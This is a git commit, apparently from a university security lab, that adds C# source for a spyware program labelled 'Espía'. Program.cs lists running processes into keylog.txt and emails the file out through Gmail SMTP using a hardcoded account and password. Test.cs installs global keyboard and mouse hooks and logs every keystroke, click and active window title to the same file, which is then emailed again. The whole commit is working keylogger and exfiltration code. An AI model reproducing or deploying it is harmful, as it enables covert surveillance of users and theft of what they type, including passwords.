285f07a7eba2e10fa111ef72073080c647b34a5f
RociRo <rossmintka14@gmail.com>
2015-06-06 21:11:10 -0500

    Espía

---
+++ Archivo espía/Lab10 - RemoteManager/Pruebas/Program.cs
@@ -0,0 +1,122 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using WQLUtil.Util.ProcessEx;
+using System.Management;
+using System.Windows.Forms;
+//Para manejo de archivo
+using System.IO;
+//Para correo
+using System.Net.Mail;
+
+namespace Pruebas
+{
+    class Program
+    {
+        [STAThread]
+        static void Main(string[] args)
+        {
+           
+            
+            List<Process> process = ProcessManager.GetAllProcess();
+            //String fileName = @"C:\Users\Roci\Maestría\Fundamentos de Seguridad\Lab10 - RemoteManager\Pruebas\bin\Debug";
+            String fileName = "keylog.txt";
+            //@"C:\Users\Roci\Maestría\Fundamentos de Seguridad\Lab10 - RemoteManager\Pruebas\bin\Debug"
+            FileStream stream;
+            StreamWriter writer;
+            //List<Process> process = ProcessManager.GetAllProcessByHost("SERVKEY-XPS","servkey","****");
+            stream = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
+            writer = new StreamWriter(stream);
+           
+            foreach(Process p in process){
+                Console.Write("ProcessId: {0}, ", p.ProcessId);
+                Console.Write("Name: {0}, ", p.Name);
+                Console.Write("Priority: {0}, ", p.Priority);
+                Console.Write("Status: {0}, ", p.Status);
+                Console.Write("ThreadCount: {0}, ", p.ThreadCount);
+                Console.Write("Handle: {0}, ", p.Handle);
+                Console.WriteLine("OSName: {0}", p.OSName);
+
+                writer.WriteLine("ProcessId: {0}, ", p.ProcessId);
+                writer.WriteLine("Name: {0}, ", p.Name);
+                writer.WriteLine("Priority: {0}, ", p.Priority);
+                writer.WriteLine("Status: {0}, ", p.Status);
+                writer.WriteLine("ThreadCount: {0}, ", p.ThreadCount);
+                writer.WriteLine("Handle: {0}, ", p.Handle);
+                writer.WriteLine("OSName: {0}", p.OSName);
+              }
+            writer.Close();
+            stream.Close();
+
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                mail.From = new MailAddress("funseguridad@gmail.com");
+                mail.To.Add("funseguridad@gmail.com");
+                mail.Subject = "Hola";
+
+                mail.Body = "Enviando archivo de documentos espiados";
+                System.Net.Mail.Attachment attachment;
+                attachment = new System.Net.Mail.Attachment(fileName);
+                mail.Attachments.Add(attachment);
+                SmtpServer.Port = 587;
+
+                SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
+                //SmtpServer.UseDefaultCredentials = false;
+                String pass = "123EjemplO";
+                SmtpServer.Credentials = new System.Net.NetworkCredential("funseguridad@gmail.com", pass);
+                SmtpServer.EnableSsl = true;
+                SmtpServer.Send(mail);
+                MessageBox.Show("mail Send");
+                mail.Attachments.Dispose();
+                Console.WriteLine("termino correo");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            } 
+           // return;
+           writer.Close();
+           //stream.Flush();
+           stream.Close();
+
+           //stream.Unlock(textLength - 1, byteCount); 
+           Test t = new Test();
+           System.Windows.Forms.Application.Run();
+           try
+           {
+               MailMessage mail = new MailMessage();
+               SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+               mail.From = new MailAddress("funseguridad@gmail.com");
+               mail.To.Add("funseguridad@gmail.com");
+               mail.Subject = "Hola";
+
+               mail.Body = "Enviando archivo de documentos espiados 2";
+               System.Net.Mail.Attachment attachment;
+               attachment = new System.Net.Mail.Attachment(fileName);
+               mail.Attachments.Add(attachment);
+               SmtpServer.Port = 587;
+
+               SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
+               //SmtpServer.UseDefaultCredentials = false;
+               String pass = "123EjemplO";
+               SmtpServer.Credentials = new System.Net.NetworkCredential("funseguridad@gmail.com", pass);
+               SmtpServer.EnableSsl = true;
+               SmtpServer.Send(mail);
+               MessageBox.Show("mail Send");
+               mail.Attachments.Dispose();
+               Console.WriteLine("termino correo");
+           }
+           catch (Exception ex)
+           {
+               MessageBox.Show(ex.ToString());
+           } 
+                  
+            //writer.Close();   
+         }      
+    }
+}
---
+++ Archivo espía/Lab10 - RemoteManager/Pruebas/Test.cs
@@ -0,0 +1,129 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+//Para manejo de archivo
+using System.IO;
+//Para correo
+using System.Net.Mail;
+
+namespace Pruebas
+{
+    public partial class Test : Form
+    {
+        private int y = 0;
+        private int velocity = 5;
+        private int x = 0;
+        private WQLUtil.Util.Window.WindowManager w;
+        private WQLUtil.Util.Mouse.MouseManager m;
+        String fileName = "keylog.txt";
+        FileStream stream;
+        StreamWriter writer;
+        public Test()
+        {
+            InitializeComponent();
+            w = new WQLUtil.Util.Window.WindowManager(WinEventProc);
+            m = new WQLUtil.Util.Mouse.MouseManager();
+                 
+            m.Hook.OnMouseActivity += new MouseEventHandler(MouseMoved);
+            m.Hook.KeyDown += new KeyEventHandler(ExtKeyDown);
+            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
+            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);
+            
+            stream = new FileStream(fileName, FileMode.Open/*OrCreate, FileAccess.Write*/);
+            writer = new StreamWriter(stream);            
+            //Cursor.Position = new Point(50, 500);
+        }
+
+        private void Log(string txt)
+        {
+            Console.WriteLine("{0}", txt);
+        }
+
+        public void MouseMoved(object sender, MouseEventArgs e)
+        {
+            x = e.X;
+            y = e.Y;
+
+            Console.WriteLine(String.Format("x = {0},  y= {1}, delta = {2}", e.X, e.Y, e.Delta));
+            writer.WriteLine(String.Format("x = {0},  y= {1}, delta = {2}", e.X, e.Y, e.Delta));
+            if (e.Clicks > 0)
+            {
+                Log("MouseButton -- " + e.Button.ToString());
+               writer.WriteLine("MouseButton - " + e.Button.ToString());
+            }
+
+        }
+
+        public void ExtKeyDown(object sender, KeyEventArgs e)
+        {
+            Log("KeyDown - " + e.KeyData.ToString());
+            writer.WriteLine("KeyDown - " + e.KeyData.ToString());
+            WQLUtil.Util.Mouse.MouseManager.SetCursor(x, y);
+            if (e.KeyValue == 73)
+            {
+                WQLUtil.Util.Mouse.MouseManager.LeftClickExt(x, y);
+                writer.WriteLine("Clic izquierdo");
+                Console.WriteLine("Clic izquierdo");
+            }
+            else if (e.KeyValue == 68)
+            {
+                WQLUtil.Util.Mouse.MouseManager.RightClick(x, y);
+                Console.WriteLine("Clic derecho");
+                writer.WriteLine("Clic derecho");
+            }
+            else if (e.KeyValue == 39)
+                x = x + velocity;
+            else if (e.KeyValue == 40)
+                y = y + velocity;
+            else if (e.KeyValue == 37)
+                x = x - velocity;
+            else if (e.KeyValue == 38)
+                y = y - velocity;
+            else if (e.KeyValue == 77)
+                WQLUtil.Util.Window.WindowManager.MinAll();
+            else if (e.KeyValue == 78)
+                WQLUtil.Util.Window.WindowManager.MaxAll();
+            
+            Console.WriteLine("x={0}, y={1}, Key = {2}", x, y, e.KeyValue);
+            writer.WriteLine("x={0}, y={1}, Key = {2}", x, y, e.KeyValue);
+           
+        }
+
+        public void ExtKeyPress(object sender, KeyPressEventArgs e)
+        {
+            Log("KeyPress 	- " + e.KeyChar);
+            writer.WriteLine("KeyPress 	- " + e.KeyChar);
+        }
+
+        public void ExtKeyUp(object sender, KeyEventArgs e)
+        {
+            Log("KeyUp - " + e.KeyData.ToString());
+            writer.WriteLine("KeyUp - " + e.KeyData.ToString());
+        }
+
+        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
+        {
+            Log("Ventana activa - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
+            writer.WriteLine("Ventana activa - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
+        }
+
+
+        private void Test_Load(object sender, EventArgs e)
+        {
+
+ 
+        }
+
+        private void Test_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            stream.Close();
+            writer.Close();   
+
+        }
+    }
+}
